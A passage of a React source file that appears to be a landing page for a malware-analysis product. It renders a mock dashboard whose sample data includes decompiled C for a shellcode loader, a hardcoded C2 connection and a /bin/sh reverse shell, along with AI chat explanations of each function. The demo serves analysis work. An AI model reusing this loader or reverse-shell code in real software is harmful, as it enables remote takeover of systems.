              color: theme.footerTextMuted,
              textTransform: 'uppercase',
            }}>
              <span style={{ display: 'inline-flex', alignItems: 'center', gap: 8 }}>
                <span style={{ width: 6, height: 6, borderRadius: 999, background: '#4ade80', boxShadow: '0 0 8px #4ade80aa' }} />
                Early access
              </span>
              <span style={{ opacity: 0.4 }}>·</span>
              <span>Private beta</span>
              <span style={{ opacity: 0.4 }}>·</span>
              <span>Built for sensitive samples</span>
              <span style={{ opacity: 0.4 }}>·</span>
              <span>Team-ready</span>
            </div>

          </Reveal>
        </div>
      </div>

      <div
        style={{
          maxWidth: 1280,
          margin: '40px auto 0',
          display: 'flex',
          alignItems: isTablet ? 'flex-start' : 'center',
          justifyContent: 'space-between',
          flexDirection: isTablet ? 'column' : 'row',
          gap: isTablet ? 16 : 24,
          fontSize: 12.5,
          color: theme.muted,
          fontFamily: mono,
          letterSpacing: '0.05em',
        }}
      >
        <div>© 2026 MELANI RESEARCH, INC.</div>
        <div style={{ display: 'flex', gap: isMobile ? 14 : 28, flexWrap: 'wrap' }}>
          <span>PRIVACY</span>
          <span>TERMS</span>
          <span>SECURITY</span>
          <span>STATUS · OPERATIONAL</span>
        </div>
      </div>
    </div>
  );
}

// ──────────────────────────────────────────────────────────
// VAWorkspace — interactive dashboard preview
// ──────────────────────────────────────────────────────────
function VAWorkspace({ theme, serif, mono, brandMono }) {
  const { isMobile, isTablet } = useResponsive();

  const FUNCTIONS = [
    { addr: '0x401120', name: 'main', size: 312, xrefs: 2, suspicious: false, renamed: true },
    { addr: '0x401280', name: 'decrypt_and_execute', size: 186, xrefs: 3, suspicious: true, renamed: true },
    { addr: '0x401340', name: 'xor_buffer', size: 94, xrefs: 4, suspicious: false, renamed: true },
    { addr: '0x4013a0', name: 'inet_connect', size: 128, xrefs: 2, suspicious: true, renamed: true },
    { addr: '0x401420', name: 'resolve_api_hashes', size: 224, xrefs: 6, suspicious: true, renamed: true },
    { addr: '0x401500', name: 'sub_401500', size: 76, xrefs: 1, suspicious: false, renamed: false },
    { addr: '0x401560', name: 'rc4_init', size: 112, xrefs: 3, suspicious: false, renamed: true },
    { addr: '0x401740', name: 'spawn_reverse_shell', size: 196, xrefs: 1, suspicious: true, renamed: true },
    { addr: '0x401830', name: 'parse_command', size: 164, xrefs: 3, suspicious: true, renamed: true },
    { addr: '0x4018d0', name: 'sleep_jitter', size: 44, xrefs: 2, suspicious: false, renamed: true },
  ];

  const FN_CONTENT = {
    '0x401280': {
      disasm: [
        { addr: '0x401280', label: 'decrypt_and_execute:' },
        { addr: '0x401280', bytes: '55', op: 'push', args: 'rbp' },
        { addr: '0x401281', bytes: '48 89 e5', op: 'mov', args: 'rbp, rsp' },
        { addr: '0x401284', bytes: '48 83 ec 40', op: 'sub', args: 'rsp, 0x40', comment: '// allocate frame' },
        { addr: '0x401290', bytes: '48 8b 3d 79 2d', op: 'lea', args: 'rdi, [rel key_32byte]', comment: '// 32-byte XOR key', isRef: true },
        { addr: '0x40129b', bytes: 'ba 00 04 00 00', op: 'mov', args: 'edx, 0x400', comment: '// length = 1024' },
        { addr: '0x4012a0', bytes: 'e8 9b 00 00 00', op: 'call', args: 'xor_buffer', isCall: true },
        { addr: '0x4012a5', bytes: '85 c0', op: 'test', args: 'eax, eax' },
        { addr: '0x4012a7', bytes: '74 1a', op: 'jz', args: 'integrity_fail', comment: '// bail if XOR failed', isJump: true },
        { addr: '0x4012b0', bytes: 'ff d7', op: 'call', args: 'rdi', comment: '// jump to shellcode', isDangerous: true },
        { addr: '0x4012b5', bytes: 'eb 0c', op: 'jmp', args: 'cleanup', isJump: true },
        { addr: '0x4012c1', bytes: 'c9', op: 'leave', args: '' },
        { addr: '0x4012c2', bytes: 'c3', op: 'ret', args: '' },
      ],
      decomp: `// decrypt_and_execute(void *buf, void *key)
// Melani: XOR-decrypts buf using a 32-byte key at 0x4010,
//         then executes the decrypted buffer as shellcode.

int decrypt_and_execute(void *buf, void *key) {
    unsigned char *xor_key = (unsigned char *)0x4010;
    int result;

    // XOR-decrypt the buffer in place
    result = xor_buffer(xor_key, buf, 0x400);

    if (result == 0) {
        // Integrity check failed — abort
        exit(1);
    }

    // Execute decrypted shellcode directly
    result = ((int (*)(void))buf)();

    return result;
}`,
      chat: [
        { role: 'user', text: 'What does decrypt_and_execute do?' },
        { role: 'ai', text: 'XOR-decrypts a 1024-byte buffer using a hardcoded 32-byte key at 0x4010, then executes the decrypted contents directly as shellcode via call rdi.', cites: ['0x401290', '0x4012a0', '0x4012b0'] },
        { role: 'user', text: 'Is the call to rdi dangerous?' },
        { role: 'ai', text: 'Yes — call rdi at 0x4012b0 transfers execution to a user-controlled decrypted buffer. Classic staged-loader payload execution.', cites: ['0x4012b0'] },
      ],
    },
    '0x401340': {
      disasm: [
        { addr: '0x401340', label: 'xor_buffer:' },
        { addr: '0x401340', bytes: '55', op: 'push', args: 'rbp' },
        { addr: '0x401341', bytes: '48 89 e5', op: 'mov', args: 'rbp, rsp' },
        { addr: '0x401344', bytes: '31 c0', op: 'xor', args: 'eax, eax' },
        { addr: '0x401346', bytes: '', label: 'loop:' },
        { addr: '0x401346', bytes: '48 39 d0', op: 'cmp', args: 'rax, rdx' },
        { addr: '0x401349', bytes: '74 0f', op: 'je', args: 'done', isJump: true },
        { addr: '0x40134b', bytes: '0f b6 0c 06', op: 'movzx', args: 'ecx, [rsi+rax]' },
        { addr: '0x40134f', bytes: '32 0c 07', op: 'xor', args: 'cl, [rdi+rax]', comment: '// XOR step' },
        { addr: '0x401352', bytes: '88 0c 06', op: 'mov', args: '[rsi+rax], cl' },
        { addr: '0x401355', bytes: 'eb f0', op: 'jmp', args: 'loop', isJump: true },
        { addr: '0x401358', bytes: 'c9', op: 'leave', args: '' },
        { addr: '0x401359', bytes: 'c3', op: 'ret', args: '' },
      ],
      decomp: `// xor_buffer(unsigned char *key, unsigned char *buf, size_t len)
// In-place XOR decryption.

int xor_buffer(unsigned char *key, unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key[i];
    }
    return 1;
}`,
      chat: [
        { role: 'user', text: 'Walk me through xor_buffer.' },
        { role: 'ai', text: 'Tight XOR loop — iterates rax from 0 to rdx (length), XORing each byte at [rsi+rax] with the key byte at [rdi+rax]. In-place decryption. Standard polyalphabetic XOR.', cites: ['0x401346', '0x40134f'] },
      ],
    },
    '0x4013a0': {
      disasm: [
        { addr: '0x4013a0', label: 'inet_connect:' },
        { addr: '0x4013a0', bytes: '55', op: 'push', args: 'rbp' },
        { addr: '0x4013a4', bytes: 'bf 02 00 00 00', op: 'mov', args: 'edi, AF_INET' },
        { addr: '0x4013a9', bytes: 'be 01 00 00 00', op: 'mov', args: 'esi, SOCK_STREAM' },
        { addr: '0x4013ae', bytes: 'e8 6d ff ff ff', op: 'call', args: 'socket@plt', isCall: true },
        { addr: '0x4013b3', bytes: '48 8d 35 4e 2c', op: 'lea', args: 'rsi, [rel c2_addr]', comment: '// hardcoded C2', isRef: true, isDangerous: true },
        { addr: '0x4013ba', bytes: 'ba 10 00 00 00', op: 'mov', args: 'edx, 0x10' },
        { addr: '0x4013bf', bytes: 'e8 8c ff ff ff', op: 'call', args: 'connect@plt', isCall: true },
        { addr: '0x4013c4', bytes: '85 c0', op: 'test', args: 'eax, eax' },
        { addr: '0x4013c6', bytes: '78 1c', op: 'js', args: 'fail', isJump: true },
        { addr: '0x4013c8', bytes: 'c9', op: 'leave', args: '' },
        { addr: '0x4013c9', bytes: 'c3', op: 'ret', args: '' },
      ],
      decomp: `// inet_connect() — opens TCP socket to hardcoded C2.

int inet_connect(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in *c2 = (struct sockaddr_in *)0x404010;

    if (connect(sock, (struct sockaddr *)c2, 0x10) < 0) {
        return -1;
    }
    return sock;
}`,
      chat: [
        { role: 'user', text: 'Where does this connect to?' },
        { role: 'ai', text: 'Hardcoded C2 endpoint at 0x4013b3. References a sockaddr_in struct in .rodata. Resolves to update-services[.]net:8443 — flagged in threat intel.', cites: ['0x4013b3', '0x4013bf'] },
      ],
    },
    '0x401740': {
      disasm: [
        { addr: '0x401740', label: 'spawn_reverse_shell:' },
        { addr: '0x401740', bytes: '55', op: 'push', args: 'rbp' },
        { addr: '0x401744', bytes: 'e8 00 fc ff ff', op: 'call', args: 'fork@plt', isCall: true },
        { addr: '0x401749', bytes: '85 c0', op: 'test', args: 'eax, eax' },
        { addr: '0x40174b', bytes: '75 30', op: 'jnz', args: 'parent', isJump: true },
        { addr: '0x40174d', bytes: 'bf 02 00 00 00', op: 'mov', args: 'edi, 2', comment: '// stderr → socket' },
        { addr: '0x401752', bytes: 'e8 d9 fb ff ff', op: 'call', args: 'dup2@plt', isCall: true },
        { addr: '0x401757', bytes: '48 8d 3d a2 28', op: 'lea', args: 'rdi, [rel sh_path]', comment: '// "/bin/sh"', isRef: true, isDangerous: true },
        { addr: '0x40175e', bytes: '31 d2', op: 'xor', args: 'edx, edx' },
        { addr: '0x401760', bytes: 'e8 cb fb ff ff', op: 'call', args: 'execve@plt', isCall: true, isDangerous: true },
        { addr: '0x401765', bytes: 'c9', op: 'leave', args: '' },
        { addr: '0x401766', bytes: 'c3', op: 'ret', args: '' },
      ],
      decomp: `// spawn_reverse_shell() — fork + execve("/bin/sh") for C2 shell.

void spawn_reverse_shell(int sock_fd) {
    if (fork() == 0) {
        // Child — redirect stdio to socket
        dup2(sock_fd, 0);
        dup2(sock_fd, 1);
        dup2(sock_fd, 2);

        char *argv[] = { "/bin/sh", NULL };
        execve("/bin/sh", argv, NULL);
    }
}`,
      chat: [
        { role: 'user', text: 'What is this function for?' },
        { role: 'ai', text: 'Reverse shell. Forks, dups stderr to a socket fd, then execve("/bin/sh"). Connects back to attacker for interactive command execution.', cites: ['0x401744', '0x401752', '0x401760'] },
      ],
    },
  };

  // Shared per-binary data
  const STRINGS = [
    { addr: '0x404010', val: 'http://update-services[.]net:8443/c2', kind: 'url', susp: true },
    { addr: '0x404038', val: '/bin/sh', kind: 'path', susp: true },
    { addr: '0x404048', val: 'GET %s HTTP/1.1\\r\\nHost: %s\\r\\n', kind: 'fmt', susp: false },
    { addr: '0x404078', val: 'CreateRemoteThread', kind: 'api', susp: true },
    { addr: '0x4040a0', val: 'WriteProcessMemory', kind: 'api', susp: true },
    { addr: '0x4040c8', val: 'VirtualAllocEx', kind: 'api', susp: true },
    { addr: '0x4040e0', val: '/etc/passwd', kind: 'path', susp: true },
    { addr: '0x4040f8', val: 'libc.so.6', kind: 'lib', susp: false },
    { addr: '0x404108', val: 'connection failed: %s', kind: 'fmt', susp: false },
    { addr: '0x404130', val: 'AAAA-BBBB-CCCC-DDDD', kind: 'data', susp: false },
  ];
  const IMPORTS = [
    { name: 'socket', lib: 'libc.so.6', addr: '0x403020', susp: true },
    { name: 'connect', lib: 'libc.so.6', addr: '0x403028', susp: true },
    { name: 'send', lib: 'libc.so.6', addr: '0x403030', susp: false },
    { name: 'recv', lib: 'libc.so.6', addr: '0x403038', susp: false },
    { name: 'execve', lib: 'libc.so.6', addr: '0x403040', susp: true },
    { name: 'fork', lib: 'libc.so.6', addr: '0x403048', susp: true },
    { name: 'dup2', lib: 'libc.so.6', addr: '0x403050', susp: false },
    { name: 'memcpy', lib: 'libc.so.6', addr: '0x403058', susp: false },
    { name: 'malloc', lib: 'libc.so.6', addr: '0x403060', susp: false },
    { name: 'mmap', lib: 'libc.so.6', addr: '0x403070', susp: true },
    { name: 'mprotect', lib: 'libc.so.6', addr: '0x403078', susp: true },
  ];
  const HEX_BYTES = React.useMemo(() => {
    const out = [];
    let seed = 1337;
    for (let i = 0; i < 256; i++) {
      seed = (seed * 16807) % 2147483647;
      out.push(seed % 256);
    }
    out[0] = 0x7f; out[1] = 0x45; out[2] = 0x4c; out[3] = 0x46;
    return out;
  }, []);

  const baseDashHeight = isMobile ? 600 : isTablet ? 760 : 880;
  const baseWorkspaceW = isTablet ? 980 : 1280;
  const defaultContent = FN_CONTENT['0x401280'];
  const [selectedAddr, setSelectedAddr] = React.useState('0x401280');
  const [filter, setFilter] = React.useState('all');
  const [topTab, setTopTab] = React.useState('disasm');
  const [bottomTab, setBottomTab] = React.useState('decomp');
  const [split, setSplit] = React.useState(!isMobile && !isTablet);
  const [stringFilter, setStringFilter] = React.useState('all');
  const [fnW, setFnW] = React.useState(isTablet ? 220 : 256);
  const [chatW, setChatW] = React.useState(340);
  const [splitPct, setSplitPct] = React.useState(52);
  const [workspaceW, setWorkspaceW] = React.useState(baseWorkspaceW);
  const [workspaceH, setWorkspaceH] = React.useState(baseDashHeight);
  const drag = React.useRef(null);

  const startDrag = (which) => (e) => {
    e.preventDefault();
    drag.current = { which, x: e.clientX, y: e.clientY, fnW, chatW, splitPct, workspaceW, workspaceH };
    document.body.style.cursor = which === 'split' ? 'row-resize' : which === 'workspace' ? 'nwse-resize' : 'col-resize';
    document.body.style.userSelect = 'none';
  };

  React.useEffect(() => {
    const move = (e) => {
      if (!drag.current) return;
      const d = drag.current;
      if (d.which === 'fn') setFnW(Math.max(180, Math.min(360, d.fnW + (e.clientX - d.x))));
      if (d.which === 'chat') setChatW(Math.max(260, Math.min(480, d.chatW - (e.clientX - d.x))));
      if (d.which === 'split') setSplitPct(Math.max(25, Math.min(80, d.splitPct + ((e.clientY - d.y) / workspaceH) * 100)));
      if (d.which === 'workspace') {
        setWorkspaceW(Math.max(isTablet ? 680 : 860, Math.min(1440, d.workspaceW + (e.clientX - d.x))));
        setWorkspaceH(Math.max(isMobile ? 520 : 620, Math.min(1120, d.workspaceH + (e.clientY - d.y))));
      }
    };
    const up = () => {
      drag.current = null;
      document.body.style.cursor = '';
      document.body.style.userSelect = '';
    };
    window.addEventListener('mousemove', move);
    window.addEventListener('mouseup', up);
    return () => {
      window.removeEventListener('mousemove', move);
      window.removeEventListener('mouseup', up);
    };
  }, [workspaceH, isMobile, isTablet, fnW, chatW, splitPct, workspaceW]);

  React.useEffect(() => {
    setSplit(!isMobile && !isTablet);
  }, [isMobile, isTablet]);

  React.useEffect(() => {
    setWorkspaceW(baseWorkspaceW);
    setWorkspaceH(baseDashHeight);
    setFnW(isTablet ? 220 : 256);
    setChatW(340);
  }, [baseWorkspaceW, baseDashHeight, isTablet]);

  const tabs = [
    { key: 'disasm', label: 'Disassembly' },
    { key: 'decomp', label: 'Decompiler' },
    { key: 'hex', label: 'Hex' },
    { key: 'strings', label: 'Strings' },
    { key: 'imports', label: 'Imports' },
  ];

  const content = FN_CONTENT[selectedAddr] || defaultContent;
  const selectedFn = FUNCTIONS.find(f => f.addr === selectedAddr) || FUNCTIONS[1];
  const filteredFns = FUNCTIONS.filter(f => {
    if (filter === 'suspicious') return f.suspicious;
    if (filter === 'named') return f.renamed;
    if (filter === 'raw') return !f.renamed;
    return true;
  });

  const filterTabs = [
    { key: 'all', label: 'All', count: FUNCTIONS.length },
    { key: 'suspicious', label: 'Susp', count: FUNCTIONS.filter(f => f.suspicious).length },
    { key: 'named', label: 'Named', count: FUNCTIONS.filter(f => f.renamed).length },
    { key: 'raw', label: 'Raw', count: FUNCTIONS.filter(f => !f.renamed).length },
  ];

  const brandFaint = theme.brandSoft;
  const dashHeight = isMobile ? baseDashHeight : workspaceH;
  const sidebarW = isTablet ? 0 : 196;

  const navSections = [
    {
      label: 'WORKSPACE',
      items: [
        { icon: 'home', label: 'Overview', active: false },
        { icon: 'search', label: 'Search', active: false },
        { icon: 'folder', label: 'Samples', active: false },
      ],
    },
    {
      label: 'ANALYSIS',
      items: [
        { icon: 'cpu', label: 'Live Session', active: true },
        { icon: 'shield', label: 'Threat Map', active: false },
        { icon: 'cluster', label: 'Cluster', active: false },
      ],
    },
    {
      label: 'COLLABORATION',
      items: [
        { icon: 'users', label: 'Team', active: false, badge: '4' },
        { icon: 'chat', label: 'Comments', active: false, badge: '7' },
        { icon: 'activity', label: 'Activity', active: false },
        { icon: 'share', label: 'Share session', active: false },
      ],
    },
  ];

  const NavIcon = ({ kind, color }) => {
    const props = { width: 13, height: 13, viewBox: '0 0 16 16', fill: 'none' };
    if (kind === 'home') return <svg {...props}><path d="M2 7l6-5 6 5v7H2V7z" stroke={color} strokeWidth="1.3" strokeLinejoin="round"/></svg>;
    if (kind === 'search') return <svg {...props}><circle cx="7" cy="7" r="4.5" stroke={color} strokeWidth="1.3"/><path d="M10.5 10.5L14 14" stroke={color} strokeWidth="1.3" strokeLinecap="round"/></svg>;
    if (kind === 'folder') return <svg {...props}><path d="M2 4h4l2 2h6v7H2V4z" stroke={color} strokeWidth="1.3" strokeLinejoin="round"/></svg>;
    if (kind === 'cpu') return <svg {...props}><rect x="4" y="4" width="8" height="8" stroke={color} strokeWidth="1.3"/><path d="M2 7h2M2 9h2M12 7h2M12 9h2M7 2v2M9 2v2M7 12v2M9 12v2" stroke={color} strokeWidth="1.3"/></svg>;
    if (kind === 'shield') return <svg {...props}><path d="M8 2l5 2v5c0 3-2.5 5-5 5s-5-2-5-5V4l5-2z" stroke={color} strokeWidth="1.3" strokeLinejoin="round"/></svg>;
    if (kind === 'cluster') return <svg {...props}><circle cx="4" cy="4" r="1.6" stroke={color} strokeWidth="1.3"/><circle cx="12" cy="4" r="1.6" stroke={color} strokeWidth="1.3"/><circle cx="8" cy="12" r="1.6" stroke={color} strokeWidth="1.3"/><path d="M5 5l2 6M11 5L9 11" stroke={color} strokeWidth="1.1"/></svg>;
    if (kind === 'plug') return <svg {...props}><path d="M5 2v3M11 2v3M3 5h10v3a5 5 0 01-5 5 5 5 0 01-5-5V5z" stroke={color} strokeWidth="1.3" strokeLinejoin="round"/></svg>;
    if (kind === 'users') return <svg {...props}><circle cx="6" cy="6" r="2.5" stroke={color} strokeWidth="1.3"/><path d="M2 13c0-2.2 1.8-4 4-4s4 1.8 4 4" stroke={color} strokeWidth="1.3" strokeLinecap="round"/><circle cx="11.5" cy="5.5" r="2" stroke={color} strokeWidth="1.2"/><path d="M10 13c0-1.8 1.4-3.2 3-3.4" stroke={color} strokeWidth="1.2" strokeLinecap="round"/></svg>;
    if (kind === 'chat') return <svg {...props}><path d="M2 4h12v7H6l-3 2.5V11H2V4z" stroke={color} strokeWidth="1.3" strokeLinejoin="round"/><path d="M5 7h6M5 9h4" stroke={color} strokeWidth="1.1" strokeLinecap="round"/></svg>;
    if (kind === 'activity') return <svg {...props}><path d="M2 8h3l2-5 3 10 2-5h2" stroke={color} strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round" fill="none"/></svg>;
    if (kind === 'share') return <svg {...props}><circle cx="4" cy="8" r="2" stroke={color} strokeWidth="1.3"/><circle cx="12" cy="4" r="2" stroke={color} strokeWidth="1.3"/><circle cx="12" cy="12" r="2" stroke={color} strokeWidth="1.3"/><path d="M5.7 7l4.6-2.4M5.7 9l4.6 2.4" stroke={color} strokeWidth="1.2"/></svg>;
    return null;
  };

  const threatTags = [
    { label: 'T1027', kind: 'mitre', susp: true },
    { label: 'T1140', kind: 'mitre', susp: true },
    { label: 'shellcode-loader', kind: 'tag', susp: true },
    { label: 'staged-payload', kind: 'tag', susp: false },
  ];

  const stats = [
    { label: 'Functions', value: FUNCTIONS.length, accent: false },
    { label: 'Suspicious', value: FUNCTIONS.filter(f => f.suspicious).length, accent: true },
    { label: 'Strings', value: STRINGS.length, accent: false },
    { label: 'Imports', value: IMPORTS.length, accent: false },
    { label: 'Threat score', value: '8.4', accent: true, suffix: '/10' },
  ];

  const tabBtnStyle = (active) => ({
    padding: '5px 11px', borderRadius: 6,
    border: active ? `1px solid ${theme.brandRing}` : '1px solid transparent',
    background: active ? brandFaint : 'transparent',
    color: active ? theme.brand : theme.muted,
    fontFamily: mono, fontSize: 10.5, letterSpacing: '0.04em',
    cursor: 'pointer', whiteSpace: 'nowrap',
  });

  const renderPanel = (tabKey) => {
    if (tabKey === 'disasm') {
      return (
        <div style={{ flex: 1, overflow: 'auto', padding: '6px 0', fontFamily: mono, fontSize: 12, lineHeight: 1.7, minHeight: 0 }}>
          {content.disasm.map((line, i) => (
            <React.Fragment key={i}>
              {line.label && <div style={{ padding: '10px 14px 2px', color: theme.brand, fontWeight: 500 }}>{line.label}</div>}
              {line.op && (
                <div style={{ display: 'flex', alignItems: 'baseline', gap: 10, padding: '1px 14px', background: line.isDangerous ? brandFaint : 'transparent', whiteSpace: 'nowrap' }}>
                  <span style={{ color: theme.muted, fontSize: 10.5, minWidth: 70, flexShrink: 0 }}>{line.addr}</span>
                  {!isTablet && <span style={{ color: theme.muted, opacity: 0.5, fontSize: 10, minWidth: 100, flexShrink: 0 }}>{line.bytes}</span>}
                  <span style={{ fontWeight: 500, minWidth: 44, flexShrink: 0, color: line.isCall ? theme.brand : line.isJump ? theme.brand : theme.ink, opacity: line.isJump ? 0.85 : 1 }}>{line.op}</span>
                  <span style={{ color: line.isCall || line.isRef ? theme.brand : theme.inkSoft, flex: 1 }}>{line.args}</span>
                  {line.comment && !isMobile && <span style={{ fontSize: 11, fontStyle: 'italic', color: line.isDangerous ? theme.brand : theme.muted }}>{line.comment}</span>}
                  {line.isDangerous && !isTablet && <span style={{ fontSize: 9, fontFamily: mono, letterSpacing: '0.12em', padding: '1px 6px', borderRadius: 4, background: brandFaint, color: theme.brand, marginLeft: 6 }}>SHELLCODE</span>}
                </div>
              )}
            </React.Fragment>
          ))}
        </div>
      );
    }
    if (tabKey === 'decomp') {
      const kw = ['int', 'void', 'unsigned', 'char', 'if', 'return', 'exit', 'for', 'size_t', 'struct'];
      return (
        <div style={{ flex: 1, overflow: 'auto', minHeight: 0 }}>
          <pre style={{ margin: 0, fontFamily: mono, fontSize: 12.5, lineHeight: 1.75 }}>
            {(content.decomp || '// No decompilation available for this function.').split('\n').map((line, i) => {
              const isComment = line.trimStart().startsWith('//');
              return (
                <div key={i} style={{ display: 'flex', padding: '0 16px', minHeight: 22 }}>
                  <span style={{ color: theme.muted, opacity: 0.4, fontSize: 10.5, minWidth: 24, textAlign: 'right', marginRight: 14, flexShrink: 0, userSelect: 'none', lineHeight: '22px' }}>{i + 1}</span>
                  {isComment ? (
                    <span style={{ color: theme.muted, fontStyle: 'italic' }}>{line}</span>
                  ) : (
                    <span>{line.split(/(\s+|[(){};,*])/).map((tok, j) => {
                      if (kw.includes(tok)) return <span key={j} style={{ color: theme.brand, fontWeight: 500 }}>{tok}</span>;
                      if (tok.startsWith('0x')) return <span key={j} style={{ color: theme.brand, opacity: 0.85 }}>{tok}</span>;
                      return <span key={j}>{tok}</span>;
                    })}</span>
                  )}
                </div>
              );
            })}
          </pre>
        </div>
      );
    }
    if (tabKey === 'hex') {
      const rows = [];
      for (let i = 0; i < HEX_BYTES.length; i += 16) rows.push(HEX_BYTES.slice(i, i + 16));
      return (
        <div style={{ flex: 1, overflow: 'auto', padding: '12px 14px', fontFamily: mono, fontSize: 11.5, lineHeight: 1.7, minHeight: 0 }}>
          {rows.map((row, i) => (
            <div key={i} style={{ display: 'flex', gap: 22 }}>
              <span style={{ color: theme.muted, minWidth: 70, flexShrink: 0 }}>{(0x401000 + i * 16).toString(16).padStart(8, '0')}</span>
              <span style={{ color: theme.inkSoft, minWidth: 340, flexShrink: 0 }}>
                {row.map((b, j) => (
                  <span key={j} style={{ color: i === 0 && j < 4 ? theme.brand : theme.inkSoft, marginRight: 4 }}>{b.toString(16).padStart(2, '0')}</span>
                ))}
              </span>
              {!isMobile && <span style={{ color: theme.muted }}>{row.map(b => (b >= 32 && b < 127 ? String.fromCharCode(b) : '.')).join('')}</span>}
            </div>
          ))}
        </div>
      );
    }
    if (tabKey === 'strings') {
      const filtered = STRINGS.filter(s => stringFilter === 'all' || (stringFilter === 'susp' ? s.susp : s.kind === stringFilter));
      const stabs = [
        { k: 'all', l: 'All', n: STRINGS.length },
        { k: 'susp', l: 'Suspicious', n: STRINGS.filter(s => s.susp).length },
        { k: 'url', l: 'URL', n: STRINGS.filter(s => s.kind === 'url').length },
        { k: 'api', l: 'API', n: STRINGS.filter(s => s.kind === 'api').length },
        { k: 'path', l: 'Path', n: STRINGS.filter(s => s.kind === 'path').length },
      ];
      return (
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minHeight: 0 }}>
          <div style={{ display: 'flex', gap: 4, padding: '8px 14px', borderBottom: `1px solid ${theme.rule}`, background: theme.bg, overflowX: 'auto', flexShrink: 0 }}>
            {stabs.map(tt => (
              <button key={tt.k} onClick={() => setStringFilter(tt.k)} style={{
                display: 'flex', alignItems: 'center', gap: 5, padding: '3px 9px', borderRadius: 5,
                border: stringFilter === tt.k ? `1px solid ${theme.brandRing}` : '1px solid transparent',
                background: stringFilter === tt.k ? brandFaint : 'transparent',
                color: stringFilter === tt.k ? theme.brand : theme.muted,
                fontFamily: mono, fontSize: 10, cursor: 'pointer', whiteSpace: 'nowrap',
              }}>{tt.l}<span style={{ opacity: 0.6 }}>{tt.n}</span></button>
            ))}
          </div>
          <div style={{ flex: 1, overflow: 'auto', fontFamily: mono, fontSize: 12 }}>
            {filtered.map(s => (
              <div key={s.addr} style={{ display: 'grid', gridTemplateColumns: isMobile ? '90px 1fr' : '100px 60px 1fr', gap: 14, padding: '8px 14px', borderBottom: `1px solid ${theme.rule}`, alignItems: 'center' }}>
                <span style={{ color: theme.muted, fontSize: 10.5 }}>{s.addr}</span>
                {!isMobile && <span style={{ fontSize: 9, letterSpacing: '0.12em', padding: '2px 6px', borderRadius: 4, background: s.susp ? brandFaint : theme.cream, color: s.susp ? theme.brand : theme.muted, textAlign: 'center' }}>{s.kind.toUpperCase()}</span>}
                <span style={{ color: s.susp ? theme.brand : theme.inkSoft, fontSize: 12, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.val}</span>
              </div>
            ))}
          </div>
        </div>
      );
    }
    if (tabKey === 'imports') {
      return (
        <div style={{ flex: 1, overflow: 'auto', fontFamily: mono, fontSize: 12, minHeight: 0 }}>
          <div style={{ display: 'grid', gridTemplateColumns: isMobile ? '90px 1fr 70px' : '100px 1fr 130px 70px', gap: 14, padding: '8px 14px', borderBottom: `1px solid ${theme.rule}`, background: theme.bg, fontSize: 9, letterSpacing: '0.14em', color: theme.muted, position: 'sticky', top: 0 }}>
            <span>ADDRESS</span>
            <span>NAME</span>
            {!isMobile && <span>LIBRARY</span>}
            <span>FLAG</span>
          </div>
          {IMPORTS.map(im => (
            <div key={im.name} style={{ display: 'grid', gridTemplateColumns: isMobile ? '90px 1fr 70px' : '100px 1fr 130px 70px', gap: 14, padding: '8px 14px', borderBottom: `1px solid ${theme.rule}`, alignItems: 'center' }}>
              <span style={{ color: theme.muted, fontSize: 10.5 }}>{im.addr}</span>
              <span style={{ color: im.susp ? theme.brand : theme.ink, fontWeight: 500 }}>{im.name}</span>
              {!isMobile && <span style={{ color: theme.muted, fontSize: 11 }}>{im.lib}</span>}
              {im.susp ? (
                <span style={{ fontSize: 9, letterSpacing: '0.12em', padding: '2px 6px', borderRadius: 4, background: brandFaint, color: theme.brand, textAlign: 'center', justifySelf: 'start' }}>RISKY</span>
              ) : <span />}
            </div>
          ))}
        </div>
      );
    }
    return null;
  };

  const panelHeader = (tabKey, label) => (
    <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '8px 14px', borderBottom: `1px solid ${theme.rule}`, background: theme.bg, flexShrink: 0 }}>
      <span style={{ fontFamily: mono, fontSize: 10, letterSpacing: '0.16em', color: theme.muted, fontWeight: 500 }}>{label}</span>
      <span style={{ fontFamily: mono, fontSize: 10.5, color: theme.ink, fontWeight: 500 }}>{tabs.find(t => t.key === tabKey)?.label}</span>
      {(tabKey === 'disasm' || tabKey === 'decomp') && (
        <span style={{ fontFamily: mono, fontSize: 10, color: theme.brand }}>{selectedFn.name}</span>
      )}
    </div>
  );

  return (
    <div style={{ padding: isMobile ? '92px 16px' : isTablet ? '110px 24px' : '120px 48px', background: theme.bg, borderTop: `1px solid ${theme.rule}` }}>
      <div style={{ width: isMobile ? '100%' : workspaceW, maxWidth: '100%', margin: '0 auto' }}>
        <Reveal><SectionEyebrow mono={mono} theme={theme} num="03" text="WORKSPACE" /></Reveal>
        <Reveal y={28} duration={800}>
          <h2 style={{
            fontFamily: serif,
            fontSize: isMobile ? 'clamp(34px, 9vw, 46px)' : isTablet ? 'clamp(40px, 6vw, 56px)' : 'clamp(44px, 4.2vw, 60px)',
            lineHeight: 1.05,
            letterSpacing: '-0.025em',
            fontWeight: 600,
            margin: `20px 0 ${isMobile ? 32 : 48}px`,
            color: theme.ink,
            maxWidth: 820,
          }}>
            Assembly, decompiler, strings, imports, and AI chat <span style={{ fontFamily: "'Instrument Serif', 'Times New Roman', serif", fontStyle: 'italic', fontWeight: 400, color: theme.brand }}>in one browser dashboard</span>.
          </h2>
        </Reveal>

        <Reveal y={40} duration={900}>
          <div style={{
            position: 'relative',
            border: `1px solid ${theme.rule}`,
            borderRadius: 14,
            overflow: 'hidden',
            background: theme.paper,
            height: dashHeight,
            display: 'flex',
            flexDirection: 'column',
            boxShadow: theme.mode === 'light'
              ? '0 30px 80px -40px rgba(0,0,0,0.18), 0 10px 30px -18px rgba(0,0,0,0.08)'
              : '0 30px 80px -30px rgba(0,0,0,0.7), 0 10px 28px -16px rgba(0,0,0,0.4)',
          }}>
            {/* Enterprise top bar — breadcrumb + user */}
            <div style={{
              height: 44, flexShrink: 0,
              display: 'flex', alignItems: 'center', justifyContent: 'space-between',
              padding: '0 16px',
              background: theme.bg,
              borderBottom: `1px solid ${theme.rule}`,
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, minWidth: 0, fontFamily: mono, fontSize: 11.5 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 7 }}>
